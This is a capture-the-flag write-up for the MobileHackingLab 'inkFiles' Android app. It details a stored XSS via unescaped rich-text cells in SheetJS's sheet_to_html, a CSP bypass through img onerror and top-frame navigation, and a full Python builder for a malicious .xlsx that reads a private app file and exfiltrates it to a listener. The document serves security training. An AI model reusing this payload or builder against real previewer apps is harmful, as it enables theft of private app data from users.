---
title: "MHL inkFiles Writeup"
date: 2026-10-12
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, react-native, webview, xss, sheetjs, xlsx, csp-bypass, file-read, exfiltration]
---

**Target:** `com.mobilehackinglab.inkfiles` (React Native file manager with in-app file preview)
**Goal:** Remotely exploit the previewer with a malicious file to read a private app file and exfiltrate it.
**Private file:** `/data/data/com.mobilehackinglab.inkfiles/files/flag.txt`

## 🚩 Flag

```
MHL{sleeve_straw_deputy}
```

Captured on the attacker listener:

```
127.0.0.1 - - [13/Oct/2026 09:29:20] "GET /?flag=MHL%7Bsleeve_straw_deputy%7D HTTP/1.1" 200 -
```

---

## 1. Attack surface

`FilePreviewActivity` is **exported** and routes a file to a per-type WebView viewer
(`app/resources/assets/<type>_viewer/viewer.html`) based on the resolved MIME type.
From `index.android.bundle` the routing is:

| Resolved MIME | Viewer |
|---|---|
| `…spreadsheetml.sheet` | `xlsx_viewer` |
| `…wordprocessingml.document` | `docx_viewer` |
| `…presentationml.presentation` | `pptx_viewer` |
| audio/video | `media_viewer` |

All three Office viewers share one WebView, configured (from the bundle) with:

```js
allowFileAccess: true,
allowFileAccessFromFileURLs: true,   // a file:// page can read other file:// URLs
allowUniversalAccessFromFileURLs: false,
javaScriptEnabled: true,
originWhitelist: ['file://*', 'http://*', 'https://*'],
onShouldStartLoadWithRequest: url =>
    url.startsWith('file:///android_asset/') ||
    url.startsWith('http://') ||
    url.startsWith('https://'),
```

So **if we get JS execution inside a viewer page**, we can read the flag
(`file://` is readable) and exfiltrate over `http://` , both are allowed by the nav guard.

## 2. The vulnerability - `sheet_to_html` rich-text XSS (SheetJS 0.20.3)

The XLSX viewer renders a sheet straight into the DOM:

```js
// app/resources/assets/xlsx_viewer/viewer.html
const table = XLSX.utils.sheet_to_html(worksheet);
document.getElementById("document-container").innerHTML = table;   // sink
```

Inside SheetJS's `sheet_to_html`, the cell value is built as:

```js
var v = d && d.v != null && (d.h || Tt(d.w || ...)) || "";
```

`Tt()` is the HTML-escaper, applied to the formatted text `.w` — **but the cell's
rich-text HTML `.h` is used verbatim.** For a **rich-text shared string** (`<si>` that
starts with an `<r>` run), SheetJS sets `.h = fo(so(a.r))`, and `fo()` emits each run's
text with only `\n → <br/>` - **no HTML escaping**:

```js
// per-run emit inside fo()
return a[0].join("") + a[1].replace(/\r\n|\n/g, "<br/>") + a[2].join("");
//                     ^^^^ run text — NOT escaped
```

The resulting `.h` is written into the page via `innerHTML` → **stored XSS**.

> This mirrors the real-world class of bug in Android file-manager previewers that
> render spreadsheets in a WebView with local-file access enabled.

## 3. Bypassing the CSP

`xlsx_viewer/viewer.html` ships a CSP:

```
default-src 'self'; script-src 'self' 'unsafe-inline';
connect-src file:; img-src 'none'; media-src 'none';
frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'
```

Consequences and the bypass:

| Restriction | Effect | Our approach |
|---|---|---|
| `script-src 'unsafe-inline'` | inline event handlers allowed | trigger JS with `onerror=` |
| `img-src 'none'` | `<img>` load is blocked | the block **fires `onerror`** → runs our JS |
| `connect-src file:` | `fetch`/XHR to `http://` blocked; `file://` allowed | read flag over `file://` |
| no `navigate-to` | top-frame navigation **not restricted** | exfiltrate via `window.location` |
| nav guard allows `http://` | navigation to our server permitted | `location = http://LHOST/?flag=…` |

Two details that matter:

* **Use `XMLHttpRequest`, not `fetch()`** - Chromium's `fetch` does not support the
  `file://` scheme (it throws *"TypeError: Failed to fetch"*). The app's own loader uses XHR.
* **Exfil via navigation**, because `connect-src file:` blocks an outbound `http` fetch.

## 4. Payload

Delivered as the `onerror` of an injected `<img>`:

```js
var x = new XMLHttpRequest();
x.open('GET', 'file:///data/data/com.mobilehackinglab.inkfiles/files/flag.txt');
x.onload  = () => { window.location.href = 'http://127.0.0.1:8888/?flag=' + encodeURIComponent(x.responseText); };
x.onerror = () => { window.location.href = 'http://127.0.0.1:8888/?xhrerr=' + encodeURIComponent(x.status); };
x.send();
```

Carried inside the rich-text run of `xl/sharedStrings.xml` (XML-encoded; SheetJS decodes it):

```xml
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
  <si><r><t xml:space="preserve">&lt;img src=x onerror=&quot;…payload…&quot;&gt;</t></r></si>
</sst>
```

Build it with the included script:

```bash
python3 build_exploit.py 127.0.0.1:8888 exploit.xlsx
```

## 5. Proof of concept

```bash
# attacker listener (host)
python3 -m http.server 8888
adb reverse tcp:8888 tcp:8888

# deliver + launch
adb push exploit.xlsx /sdcard/Download/exploit.xlsx
adb shell am force-stop com.mobilehackinglab.inkfiles
adb shell am start -n com.mobilehackinglab.inkfiles/.FilePreviewActivity \
  -a android.intent.action.VIEW \
  -d "file:///sdcard/Download/exploit.xlsx" \
  -t application/vnd.openxmlformats-officedocument.spreadsheetml.sheet \
  -f 0x18000000
```

![poc](/assets/img/posts/mhl-inkfiles/poc.png)



The listener receives:

```
127.0.0.1 - - [13/Oct/2026 09:29:20] "GET /?flag=MHL%7Bsleeve_straw_deputy%7D HTTP/1.1" 200 -
```

![server](/assets/img/posts/mhl-inkfiles/server.png)



> *Environment notes:* the app needs storage access to read `/sdcard/Download`
> (`adb shell appops set com.mobilehackinglab.inkfiles MANAGE_EXTERNAL_STORAGE allow`,
> or stage the file in `/sdcard/Android/data/com.mobilehackinglab.inkfiles/files/`).
> Keep the screen awake , device doze can buffer the navigation exfil.



## PoC Script

```python
#!/usr/bin/env python3
"""
inkFiles (MobileHackingLab) — malicious XLSX builder.

Builds a .xlsx whose A1 cell is a *rich-text* shared string. SheetJS 0.20.3's
sheet_to_html() emits a cell's rich-text HTML (.h) WITHOUT escaping, so the run
text lands in the WebView via innerHTML verbatim -> stored XSS in the xlsx viewer.

Payload: <img src=x onerror="..."> (onerror fires because CSP img-src 'none'
blocks the load; inline handler allowed by script-src 'unsafe-inline').
It reads the private flag with XMLHttpRequest (file:// is unsupported by fetch())
and exfiltrates via top-frame navigation (CSP connect-src is file: only, but
there is no navigate-to directive and the nav guard allows http://).
"""
import sys, zipfile
from xml.sax.saxutils import escape

LHOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:8888"
OUT   = sys.argv[2] if len(sys.argv) > 2 else "exploit.xlsx"
FLAG  = "/data/data/com.mobilehackinglab.inkfiles/files/flag.txt"

js = (
    "var x=new XMLHttpRequest();"
    "x.open('GET','file://%s');"
    "x.onload=function(){window.location.href='http://%s/?flag='+encodeURIComponent(x.responseText)};"
    "x.onerror=function(){window.location.href='http://%s/?xhrerr='+encodeURIComponent(x.status)};"
    "x.send()" % (FLAG, LHOST, LHOST)
)
payload_html = '<img src=x onerror="%s">' % js
t_inner = escape(payload_html, {'"': '&quot;'})   # XML-encode; SheetJS decodes it back

parts = {
 "[Content_Types].xml":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
   '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
   '<Default Extension="xml" ContentType="application/xml"/>'
   '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
   '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
   '<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>'
   '</Types>',
 "_rels/.rels":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>'
   '</Relationships>',
 "xl/workbook.xml":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
   'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
   '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>',
 "xl/_rels/workbook.xml.rels":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
   '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>'
   '</Relationships>',
 "xl/worksheets/sheet1.xml":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
   '<dimension ref="A1"/><sheetData><row r="1">'
   '<c r="A1" t="s"><v>0</v></c>'
   '</row></sheetData></worksheet>',
 # rich-text shared string: MUST start with <r> so SheetJS takes the rich path
 # (a.h = fo(so(a.r))), where run text is emitted UNescaped.
 "xl/sharedStrings.xml":
   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
   '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">'
   '<si><r><t xml:space="preserve">%s</t></r></si></sst>' % t_inner,
}

with zipfile.ZipFile(OUT, "w", zipfile.ZIP_DEFLATED) as z:
    for name, data in parts.items():
        z.writestr(name, data)
print("wrote %s  (LHOST=%s)" % (OUT, LHOST))
```



## Files

* `build_exploit.py` - self-contained XLSX builder (no external deps).
* `exploit.xlsx` - ready-to-fire PoC (targets `127.0.0.1:8888`).
